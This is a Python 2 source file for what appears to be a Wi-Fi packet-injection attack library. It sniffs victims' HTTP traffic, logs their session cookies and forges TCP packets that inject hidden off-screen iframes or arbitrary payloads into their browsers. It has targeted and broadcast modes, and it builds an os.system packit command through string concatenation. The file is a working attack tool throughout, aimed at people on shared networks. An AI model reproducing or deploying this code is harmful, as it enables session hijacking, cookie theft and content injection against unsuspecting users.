from threading import Thread
from Queue import Queue, Empty
from scapy.all import *
import gzip
import binascii


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

'''
VictimParameters class
An instance of this class is always necessary to run
the application, because it holds your injections.
Define victim detection parameters.
For targeted mode, this is a property of Victim.
For broadcast mode, this is a property of PacketHandler
'''
class VictimParameters:

	def __init__(self,*positional_parameters, **keyword_parameters):
		if ('websites' in keyword_parameters):
			self.websites=keyword_parameters['websites']
		else:
			self.websites=None
		if ('inject_file' in keyword_parameters):
			self.inject_file=keyword_parameters['inject_file']
		else:
			self.inject_file=None

		if ('in_request' in keyword_parameters):
			self.in_request=keyword_parameters['in_request']
		else:
			self.in_request=None
		if ('in_request_handler' in keyword_parameters):
			self.in_request_handler=keyword_parameters['in_request_handler']
		else:
			self.in_request_handler=None
		if (self.websites is None and self.inject_file is None and self.in_request is None):
			print "[ERROR] Please specify victim parameters"
			exit(1)
		if (self.in_request is not None and (self.websites is None and self.inject_file is None)):
			print "[ERROR] You must select websites or an inject file for use with in_request"
		else:
			if (self.websites is not None):
				self.website_injects=[]
				for website in self.websites:
					self.website_injects.append((website,self.get_iframe(website,"0")))
			if (self.inject_file is not None):
				self.file_inject=self.load_injection(self.inject_file)
				self.file_injected=0
	'''
	Default request handler,
	just checks if in_request string
	is contained in the request
	(i.e. in_request="Firefox")
	'''
	def default_request_handler(self,request):
		if (self.in_request in request):
			return True
		else:
			return False
	'''
	Generate hex string in packit format
	from injection string
	'''
	def hex_injection(self,injection):
		k=binascii.hexlify(injection)
		n=2
		inject="0x"
		for item in [k[i:i+n] for i in range(0, len(k), n)]:
			inject+=item+" "
		return inject


	'''
	Process request, send it to custom
	handler if set, otherwise use default
	'''
	def proc_in_request(self,request):
		if (self.in_request_handler is not None):
			return self.in_request_handler(request)
		else:
			return self.default_request_handler(request)
	'''
	Generate iframe HTML
	'''
	def create_iframe(self,website,id):
	        iframe='''<iframe id="iframe'''+id+'''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
	        return iframe

	'''
	Loads an injection from file if --injection is set
	'''
	def load_injection(self,injectionfile):
		f = open(injectionfile,'r')
		try:
			data=f.read()
		finally:
			f.close()
		return data
		'''
		#GZIP - NOT IMPLEMENTED YET
		f = open(injectionfile,'r')
		try:
			data=f.read()
		finally:
			f.close()
		buf = StringIO()
		f = gzip.GzipFile(mode='wb', fileobj=buf)
		try:
			f.write(data)
		finally:
			f.close()
		compressed_data=buf.getvalue()
		k=binascii.hexlify(compressed_data)
		n=2
		inject="0x"
		for item in [k[i:i+n] for i in range(0, len(k), n)]:
			inject+=item+" "
		print inject
		'''

	'''
	Creates the final injection string when --websites is set
	'''
	def create_iframe_injection(self,injects):
	        proceed=0
	        f='\n'
	        f+='''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n'''
	        f+='''<html xmlns="http://www.w3.org/1999/xhtml">\n'''
	        f+='''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n'''
	        f+=injects
	        f+='</div>'
	        injection=f
	        return injection

	'''
	iframe generation function, src filled in via JS
	'''
	def get_iframe(self,website,i):
                #THIS GENERATES AN IFRAME WITH EMPTY SRC, TO BE FILLED IN LATER IN JAVASCRIPT TO BYPASS SOME RESTRICTIONS
                iframes=self.create_iframe(website,str(i))
                iframes+='''<script>\n'''
                iframes+='''function setIframeSrc'''+str(i)+'''() {\n'''
                iframes+='''var s = "'''+website+'''";\n'''
                iframes+='''var iframe1 = document.getElementById('iframe'''+str(i)+'''');\n'''
                iframes+='''if ( -1 == navigator.userAgent.indexOf("MSIE") ) {\n'''
                iframes+='''iframe1.src = s;\n'''
                iframes+='''}\nelse {\n'''
                iframes+='''iframe1.location = s;\n'''
                iframes+=''' }\n}\ntry{\nsetTimeout(setIframeSrc'''+str(i)+''', 10);\n} catch (err){\n}\n'''
                iframes+='''</script>\n'''
                injection=self.create_iframe_injection(iframes)
		return injection

		



'''
Victim class is your target, define it by setting ip or mac address
It also needs an instance of VictimParameters, where you set what
you want to inject per victim, allowing for different attacks per
target.
This class is used by PacketHandler class
'''
class Victim:
	def __init__(self,*positional_parameters, **keyword_parameters):
		if ('ip' in keyword_parameters):
			self.ip=keyword_parameters['ip']
		else:
			self.ip=None

		if ('mac' in keyword_parameters):
			self.mac=keyword_parameters['mac']
		else:
			self.mac=None
		if ('victim_parameters' in keyword_parameters):
			self.victim_parameters=keyword_parameters['victim_parameters']
		else:
			self.victim_parameters=None

		if (self.ip is None and self.mac is None):
			print "[ERROR] Victim: No IP or Mac, or in_request selected"
			exit(1)

		if (self.victim_parameters is None):
			print "[ERROR] Please create VictimParameters for this Victim"
			exit(1)

		self.cookies=[]
	'''
	Returns injection for victim
	'''
	def get_injection(self):
		#CASE: no in_request defined, return injections for --websites if defined, then --injection if defined
		if (self.victim_parameters.in_request is None):
			if (self.victim_parameters.websites is not None):
				for website in self.victim_parameters.websites:
					exists=0
					for cookie in self.cookies:
						if (cookie[0] in website):
							exists=1
					if (not exists):
						for inject in self.victim_parameters.website_injects:
							if (inject[0]==website):
	#							print inject[0]
								return inject[1]
	
			if (self.victim_parameters.inject_file is not None):
				if (self.victim_parameters.file_injected==0):
					return self.victim_parameters.file_inject
		#CASE: in_request is defined, return injections for --websites if defined, then --injection if defined
		else:
			if (self.victim_parameters.websites is not None):
				for website in self.victim_parameters.websites:
					exists=0
					for cookie in self.cookies:
						if (cookie[0] in website):
							exists=1
					if (not exists):
						for inject in self.victim_parameters.website_injects:
							if (inject[0]==website):
	#							print inject[0]
								return inject[1]
	
			if (self.victim_parameters.inject_file is not None):
				if (self.victim_parameters.file_injected==0):
					return self.victim_parameters.file_inject
	
	'''
	Checks if cookie has already been captured
	'''
	def check_add_cookie(self,cookie):
		exists=0
		for existing_cookie in self.cookies:
			if (existing_cookie[0] == cookie[0]):
				exists=1
		if (not exists and cookie[1]!="NONE"):
			print "[+] New cookie detected for ",self.mac
			print cookie
			self.cookies.append(cookie)
		else:
			if (cookie[1]=="NONE"):
				#ADD THE NONE ANYWAY COOKIE SO GET_INJECTION() CAN SKIP TO THE NEXT IFRAME
				self.cookies.append(cookie)
				if (self.ip is not None):
					print bcolors.WARNING+"[!] No cookie on client",self.ip," for website",cookie[0]+bcolors.ENDC
				else:
					print bcolors.WARNING+"[!] No cookie on client",self.mac," for website",cookie[0]+bcolors.ENDC
	'''
	Cookie handling function, if --websites is set,
	ignores all cookies for hosts other than specified
	'''
	def add_cookie(self,cookie):
#		print cookie
		if (self.victim_parameters.websites is not None):
			for website in self.victim_parameters.websites:
				if (cookie[0] in website):
					self.check_add_cookie(cookie)
		else:
			self.check_add_cookie(cookie)

'''
Injector class, based on the interface selected,
it uses scapy or packit to inject packets on the networks
'''
class Injector:
	def __init__(self,interface):
		self.interface=interface

	'''
	inject function performs the actual injection, using
	scapy for open networks (monitor-mode) and packit for
	WEP/WPA injection
	'''
	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection):
		print bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+bcolors.ENDC
		if ("mon" in self.interface):
			packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
			try:
				sendp(packet,iface=self.interface,verbose=0)
			except:
				raise
		else:
			## MEASURED THIS, TAKES ABOUT 1.45ms TO DO THIS FOR A 195 LINE INJECTION (WHICH IS BIG), ballsy FROM EXAMPLES TAKES 0.1ms ON AVERAGE SO IT'S PRETTY IRRELEVANT TIME-WISE
			k=binascii.hexlify(injection)
			n=2
			inject="0x"
			for item in [k[i:i+n] for i in range(0, len(k), n)]:
				inject+=item+" "
			injection=inject
			cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F FA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
			cmd+=injection
			cmd+='" >/dev/null 2>&1 &'
			os.system(cmd)
			#TODO: Send FIN to client + server to stop junk
	#		print cmd
		

'''
PacketHandler class
This class does all the heavy-lifting. It has an optional Victims parameters that
is a List of instances of Victim for targeted mode, or can be fed an instance of 
VictimParameters directly if working in broadcast mode and attacking all clients.
'''
class PacketHandler:
	def __init__(self,*positional_parameters, **keyword_parameters):
		if ('victims' in keyword_parameters):
                        self.victims=keyword_parameters['victims']
		else:
			self.victims=[]
		if ('excluded' in keyword_parameters):
			self.excluded=keyword_parameters['excluded']
		else:
			self.excluded=None
		if ('handler' in keyword_parameters):
			self.handler=keyword_parameters['handler']
		else:
			self.handler=None
		if ('i' in keyword_parameters):
                        self.i=keyword_parameters['i']
		else:
			self.i=None
		if ('victim_parameters' in keyword_parameters):
			self.victim_parameters=keyword_parameters['victim_parameters']
		else:
			self.victim_parameters=None
		if (self.i is None):
			print "[ERROR] No injection interface selected"
			exit(1)
		if (len(self.victims)==0 and self.victim_parameters is None):
			print "[ERROR] Please specify victim parameters or Victim List"
			exit(1)
		self.newvictims=[]
		self.injector=Injector(self.i)

	'''
	Looks for cookie in string returned by
	PacketHandler.get_request(), returns
	a List object [host,cookie] if there is
	one, otherwise returns None
	'''
	def search_cookie(self,ret2):
		if (len(ret2.strip())>0):
			arr=ret2.split("\n")
			host=""
			cookie=""
#			print ret2
			for line in arr:
				if ('Cookie' in line):
					cookie=line.strip()
				if ('Host' in line):
					host=line.split()[1].strip()
			if (len(host)!=0 and len(cookie)!=0):
				return [host,cookie]
			else:
				if (len(host)>0):
					return (host,None)
				else:
					return None
		else:
			return None

	'''
	Extracts request payload as string from packet object
	if there is payload, otherwise returns None
	'''
	def get_request(self,pkt):
		ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
		if (len(ret2.strip())>0):
#			print ret2.translate(None,"'").strip()
			return ret2.translate(None,"'").strip()
		else:
			return None

	'''
	Default packet handler, looks for GET requests
	in the TCP layer
	'''
	def handle_default(self,packet):
		if (packet.haslayer(IP) and packet.haslayer(TCP)):
			#MONITOR MODE
			if (packet.haslayer(Dot11) and not packet.haslayer(Ether)):
				vicmac=packet.getlayer(Dot11).addr2
				rtrmac=packet.getlayer(Dot11).addr1
			#TAP MODE
			else:
				vicmac=packet.getlayer(Ether).src
				rtrmac=packet.getlayer(Ether).dst
			vicip=packet.getlayer(IP).src
			svrip=packet.getlayer(IP).dst
			vicport=packet.getlayer(TCP).sport
			svrport=packet.getlayer(TCP).dport
			size=len(packet.getlayer(TCP).load)
			acknum=str(int(packet.getlayer(TCP).seq)+size)
			seqnum=packet.getlayer(TCP).ack
			request=self.get_request(packet)
			if ("GET" not in request):
				return 0
			cookie=self.search_cookie(request)
#			print (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)

	'''
	This function does cookie management for broadcast mode
	and targeted mode.
	A new mode is also added that can work in both broadcast
	added that if VictimParameters is set, it also performs a
	broadcast attack
	'''
	def cookie_mgmt(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
		if (len(self.victims)==0):
			try:
				k=cookie[1]
			except:
#				print cookie
				cookie=["NONE","NONE"]
			if (cookie[1] is not None):
				exists=0
				for victim in self.newvictims:
					if (victim.ip is not None):
						if (victim.ip==vicip):
							victim.add_cookie(cookie)
							exists=1
					else:
						if (victim.mac is not None):
							if (victim.mac.lower()==vicmac.lower()):
								victim.add_cookie(cookie)
								exists=1
				if (exists==0):
#					print "here"
					v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
					v1.add_cookie(cookie)
					self.newvictims.append(v1)
			else:
				if (cookie[0] is not None and cookie[1] is None):
#					print bcolors.WARNING+"[!] No cookie found for",cookie[0]+bcolors.ENDC
					newcookie=[cookie[0],"NONE"]
					cookie=newcookie
					for victim in self.newvictims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								victim.add_cookie(cookie)
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									victim.add_cookie(cookie)
				exists=0
				for victim in self.newvictims:
					if (victim.ip is not None):
						if (victim.ip==vicip):
							exists=1
					else:
						if (victim.mac is not None):
							if (victim.mac.lower()==vicmac.lower()):
								exists=1
				if (exists==0):
					v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
					self.newvictims.append(v1)
		else:
			vic_in_targets=0
			try:
				k=cookie[1]
			except:
				try:
					k=cookie[0]
					cookie[1]="NONE"
				except:
					cookie=["NONE","NONE"]
			if (cookie[1] is not None):
				for victim in self.victims:
					if (victim.ip is not None):
						if (victim.ip==vicip):
							vic_in_targets=1
							victim.add_cookie(cookie)
					else:
						if (victim.mac is not None):
							if (victim.mac.lower()==vicmac.lower()):
								vic_in_targets=1
								victim.add_cookie(cookie)
			else:
				if (cookie[0] is not None and cookie[1] is None):
#					print bcolors.WARNING+"[!] Victim ",vicmac,"cookie not found for website",cookie[0]+bcolors.ENDC
					newcookie=[cookie[0],"NONE"]
					cookie=newcookie
					for victim in self.victims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								vic_in_targets=1
								victim.add_cookie(cookie)
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									victim.add_cookie(cookie)
									vic_in_targets=1
			#IF VIC IS IN TARGETS, RETURN
			if (vic_in_targets==1):
				return
			#ELSE, PROCEED IF VICTIM_PARAMETERS IS SET
			if (self.victim_parameters is not None):
				try:
					k=cookie[1]
				except:
#					print cookie
					cookie=["NONE","NONE"]
				if (cookie[1] is not None):
					exists=0
					for victim in self.newvictims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								victim.add_cookie(cookie)
								exists=1
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									victim.add_cookie(cookie)
									exists=1
					if (exists==0):
	#					print "here"
						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
						v1.add_cookie(cookie)
						self.newvictims.append(v1)
				else:
					if (cookie[0] is not None and cookie[1] is None):
	#					print bcolors.WARNING+"[!] No cookie found for",cookie[0]+bcolors.ENDC
						newcookie=[cookie[0],"NONE"]
						cookie=newcookie
						for victim in self.newvictims:
							if (victim.ip is not None):
								if (victim.ip==vicip):
									victim.add_cookie(cookie)
							else:
								if (victim.mac is not None):
									if (victim.mac.lower()==vicmac.lower()):
										victim.add_cookie(cookie)
					exists=0
					for victim in self.newvictims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								exists=1
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									exists=1
					if (exists==0):
						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
						self.newvictims.append(v1)
					
	'''
	Process injection function, uses the PacketHandler.victims List
	if it was set, to check if the packet belongs to any of the targets.
	If no victims List is set, meaning it's in broadcast mode, it checks
	for the victim in PacketHandler.newvictims and gets the injection for
	it, if there is one, and injects it via Injector.inject()
	'''
	def proc_injection(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
		if (len(self.victims)==0):
			if (self.victim_parameters.in_request is not None):
				result=self.victim_parameters.proc_in_request(request)
#				print result
				if (not result):
					return 0
			if (self.excluded is not None):
				for host in self.excluded:
					if (svrip in host):
						return 0
			for victim in self.newvictims:
				if (victim.ip is not None):
					if (victim.ip==vicip):
						injection=victim.get_injection()
						if (injection is not None):
							self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
				else:
					if (victim.mac is not None):
						if (victim.mac.lower()==vicmac.lower()):
							injection=victim.get_injection()
							if (injection is not None):
								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
		else:
			if (self.victim_parameters is not None):
				if (self.victim_parameters.in_request is not None):
					result=self.victim_parameters.proc_in_request(request)
	#				print result
					if (not result):
						return 0
				if (self.excluded is not None):
					for host in self.excluded:
						if (svrip in host):
							return 0
				for victim in self.newvictims:
					if (victim.ip is not None):
						if (victim.ip==vicip):
							injection=victim.get_injection()
							if (injection is not None):
								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
					else:
						if (victim.mac is not None):
							if (victim.mac.lower()==vicmac.lower()):
								injection=victim.get_injection()
								if (injection is not None):
									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)			
			if (self.excluded is not None):
				for host in self.excluded:
					if (svrip in host):
						return 0
			for victim in self.victims:
				if (victim.ip is not None):
					if (victim.ip==vicip):
						if (victim.victim_parameters.in_request is not None):
							result=victim.victim_parameters.proc_in_request(request)
							if (not result):
								return 0
						injection=victim.get_injection()
						if (injection is not None):
#							print vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection
							self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
				else:
					if (victim.mac is not None):
						if (victim.mac.lower()==vicmac.lower()):
							if (victim.victim_parameters.in_request is not None):
								result=victim.victim_parameters.proc_in_request(request)
								if (not result):
									return 0
							injection=victim.get_injection()
							if (injection is not None):
								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)

	'''
	Process packets coming from the sniffer.
	You can override the handler with one of your own,
	that you can use for any other packet type (e.g DNS),
	otherwise it uses the default packet handler looking
	for GET requests for injection and cookies
	'''
	def process(self,interface,pkt):
		#You can write your own handler for packets
		if (self.handler is not None):
			self.handler(interface,pkt)
		else:
#			ls(pkt)
			try:
				vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie=self.handle_default(pkt)
			except:
				return
			self.cookie_mgmt(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
			self.proc_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)

'''
Sniffer class
This is the most high-level object from the library,
using an instance of PacketHandler as the processing engine
for packets received from scapy's sniff() function
'''
class Sniffer:
	def __init__(self,packethandler,*positional_parameters, **keyword_parameters):
		if ('filter' in keyword_parameters):
                        self.filter=keyword_parameters['filter']
		else:
			self.filter=None
		if ('m' in keyword_parameters):
                        self.m=keyword_parameters['m']
		else:
			self.m=None
		if (self.m is None):
			print "[ERROR] No monitor interface selected"
			exit()
		if (self.filter is None):
			if ("mon" not in self.m):
				print "[WARN] SNIFFER: Filter empty for non-monitor interface"
		self.packethandler=packethandler
	'''
	Target function for Queue (multithreading),
	usually we set a filter for GET requests on
	the dot11 tap interface, but it can also be
	an empty string
	'''
	def sniff(self,q):
		if ("mon" in self.m):
			sniff(iface = self.m, prn = lambda x : q.put(x))
		else:
			sniff(iface = self.m,filter = self.filter, prn = lambda x : q.put(x))

	'''
	This starts a Queue which receives packets and processes them
	using the PacketHandler.process function.
	Call this function to begin actual sniffing+injection
	'''
	def threaded_sniff(self):
		q = Queue(200)
		sniffer = Thread(target = self.sniff, args=(q,))
		sniffer.daemon = True
		sniffer.start()
		while True:
			try:
				pkt = q.get(timeout = 1)
				self.packethandler.process(self.m,pkt)
				q.task_done()
			except Empty:
				pass



